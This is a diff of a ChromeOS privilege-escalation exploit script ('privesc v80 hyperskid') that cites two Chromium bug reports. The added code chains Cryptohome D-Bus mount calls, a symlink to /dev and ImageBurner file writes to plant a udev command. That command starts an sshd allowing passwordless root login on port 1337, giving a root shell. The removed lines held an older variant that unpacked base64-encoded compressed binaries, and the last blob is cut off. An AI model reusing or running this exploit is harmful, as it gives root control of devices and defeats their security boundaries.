@@ -1,291 +1,93 @@
+# privesc v80 hyperskid NO ARC NO SSHFS NO BINARIES
+# made by Rory McNamara and OlyB
+# works on v80 through v83
+# https://crbug.com/1072233 (udev command execution)
+# https://crbug.com/1099390 (ImageBurner file write)
 
+get_salty_username() {
+	dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.GetSanitizedUsername string:$1 | grep string | cut -d'"' -f2
+}
 
-
-
-
-
-
-
-
-
+dbus_pack_user() {
+	user=$1
+	packeduser=$(echo -n ${user} | hexdump -e '1/1 "0x%02x,"' -v | head -c -1)
+	packedlen=$(printf '%x' ${#user})
+	echo "0x${packedlen},${packeduser}"
+}
 
 stage_sshd() {
-        ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
-        mkdir /tmp/root/
-        cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
-        cat > /tmp/sshd_config <<-EOF
+	# set up a fake ssh server using the system sshd and enabling passwordless login for root with the provided key
+	if [ ! -e /tmp/ssh_host_rsa_key ]; then
+		ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
+		mkdir /tmp/root/
+		cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
+	fi
+	cat > /tmp/sshd_config <<-EOF
 AuthorizedKeysFile /tmp/%u/k
 StrictModes no
 HostKey /tmp/ssh_host_rsa_key
 Port 1337
 EOF
-        rm -f /home/chronos/user/.ssh/known_hosts
+	rm -f /home/chronos/user/.ssh/known_hosts
+}
+
+runasroot() {
+	ssh -p 1337 -i /tmp/ssh_host_rsa_key -o StrictHostKeyChecking=no root@127.0.0.1 "$@"
 }
 
 MountEx() {
-    packeduser=$(dbus_pack_user $1)
-    dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.MountEx     array:byte:0x12,${packeduser}     array:byte:0xa,0x16,0xa,0xe,0x8,0x0,0x1a,0xa,0x8,0x1,0x10,0x1,0x18,0x1,0x20,0x1,0x28,0x0,0x12,0x4,0x74,0x65,0x73,0x74    array:byte:0x8,0x1,0x12,0x12,0xa,0x10,0xa,0x8,0x8,0x0,0x12,0x4,0x74,0x65,0x73,0x74,0x12,0x4,0x74,0x65,0x73,0x74 >/dev/null
+	packeduser=$1
+	dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.MountEx \
+	array:byte:0x12,${packeduser} \
+	array:byte:0xa,0x16,0xa,0xe,0x8,0x0,0x1a,0xa,0x8,0x1,0x10,0x1,0x18,0x1,0x20,0x1,0x28,0x0,0x12,0x4,0x74,0x65,0x73,0x74 \
+	array:byte:0x8,0x0,0x12,0x12,0xa,0x10,0xa,0x8,0x8,0x0,0x12,0x4,0x74,0x65,0x73,0x74,0x12,0x4,0x74,0x65,0x73,0x74,0x20,0x0,0x30,0x0 >/dev/null
 }
 
-get_salty_username() {
-    dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.GetSanitizedUsername string:$1 | grep string | cut -d'"' -f2
+UnmountEx() {
+	dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.UnmountEx \
+	array:byte: >/dev/null
 }
 
-dbus_pack_user() {
-    user=$1
-    packeduser=$(echo -n ${user} | xxd -i | tr -d ' \n')
-    packedlen=$(printf '%x' ${#user})
-    echo "0x${packedlen},${packeduser}"
+getdevaccess() {
+	packed=$(dbus_pack_user ${tgtuser})
+	gcache="/home/user/${salty_user}/GCache/v2"
+
+	MountEx ${packed}
+
+	rmdir ${gcache} 2>/dev/null
+	rm ${gcache} 2>/dev/null
+	ln -s /dev ${gcache}
+
+	UnmountEx
+	MountEx ${packed}
 }
 
-mountexec() {
-   dbus-send --print-reply --system --dest=org.chromium.CrosDisks /org/chromium/CrosDisks org.chromium.CrosDisks.Mount string:$1 string: array:string:rw,mountlabel=exec >/dev/null
+root_filewrite() {
+	tempfile="/home/chronos/u-${salty_user}/Downloads/filewrite"
+	echo $1 > ${tempfile}
+	ln -s $2 /dev/sdz
+	dbus-send --system --print-reply --dest=org.chromium.ImageBurner /org/chromium/ImageBurner org.chromium.ImageBurnerInterface.BurnImage string:${tempfile} string:/dev/sdz > /dev/null
+	sleep 0.5
+	rm /dev/sdz ${tempfile}
 }
 
-imageburner() {
-   dbus-send --system --print-reply --dest=org.chromium.ImageBurner /org/chromium/ImageBurner org.chromium.ImageBurnerInterface.BurnImage string:/home/chronos/u-${CROS_USER_ID_HASH}/Downloads/fifo string:/dev/sdz >/dev/null
+writefiles() {
+	root_filewrite "E:REMOVE_CMD=/bin/sh -c '/usr/sbin/sshd -f /tmp/sshd_config'" /run/udev/data/+pci\:0000\:00\:00.0
+	root_filewrite 1 /sys/devices/pci0000\:00/0000\:00\:00.0/remove
+	root_filewrite 1 /sys/devices/pci0000\:00/pci_bus/0000\:00/rescan
 }
 
-echo "Staging ssh..."
+tgtuser=$(hexdump -e '1/8 "%02x\n"' -n 8 /dev/urandom)@test.test
+salty_user="$(get_salty_username ${tgtuser})"
+
+echo "Staging sshd..."
 stage_sshd
 
-echo "Creating user for +exec..."
-user=$(xxd -ps -l 4 /dev/urandom)@exploit.local
-MountEx "${user}"
+echo "Getting /dev access..."
+getdevaccess
 
-echo "Mounting user for +exec..."
-loopdev=$(/sbin/losetup | tail -n1 | awk '{print $1}')
-mountexec ${loopdev}
+echo "Writing files..."
+writefiles
 
-echo "Unpacking binaries..."
-base64 -d <<-EOF | bunzip2 -dc > /media/removable/exec/user/exploit
-QlpoOTFBWSZTWVTsxmYAJFT/////////////////////////////////////////////4B/PvO8LrJ73qyFvTcYJVUqpXb2GpX3z
-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
-EOF
-base64 -d <<-EOF | bunzip2 -dc > /media/removable/exec/user/uid0.so
-QlpoOTFBWSZTWbpXWVoABzL////////0/////+f+Zv/3/3bf615ER3BAc33idOjDZ3950AYIqYFSAQPVyI1A00iZCmBE9GmmITyU
-H6Se0p+kaQemoPapmoyPJqAaNDQAAAekNHqNqeoP1QNDI9QaaeiNqeoHqH6SeUGhJkaI0p+I0UepoNNNNGI0GmgABoaAAAAAAANA
-AAAAAAAAAACQoUTRNPRNTbSTTNQeo9JpoBkNpMgZADI0AABoYQDQAABoAHqAAAAaABBpkZGQ0AwgaaaDINDQ0BoNDRiAMIAyGhgm
-IADJhGTTTQGjRk0aNDQyaYICVNJqNT9SNlNGj1Q9Q9TQwjIAAGTIAZAGgGQBkZAA9QAZMhhAAAAZAxMQPD0C94kj0vkEAUl/15/K
-LLizPQLKl2QGQWWnd44L4UFIwvXGbVsah1wdsnFMfJZk4yAGFmpqOG6zBojy5jJjVsNa0wi1QzGMKcmnO6uP1PRv9jYKjqX6+SCw
-WA8p5nE2zWnQJtPRXRRVkxBNnELtPXHSq3HzOO1vr0V+QSCR5oY03LWFdfGAtSA5yQdM2JsceJcVy+KTFVsrBAsoDCJvpiz1Finz
-bq+wbmk0RXfEZzpm4ouKNI1IFBP8BWSlKA6JZolKtokog6Yw7wrkdghnLFQY9UgQ7KoSQEDiLnGUIjX6WP9/J+yRn6FeUNT59Dh6
-erp8/u9sBVvdzYlNnl1ahjZOb7X2vRERBDgu39w0HJ3D8PEVAgCODsqb9TRYB8RItI6Pf6msa2NT6KCXWMQGewR7zSOYff50vsyt
-PFrdB1b3FekphXXgsuD2cowkm2uQMFZkbOJIMfdQBZrw2gOAaQCWiYkCyDGnOEjaG0cKONtsbObazBivIbGhbhkaEhsDqGLlHkYR
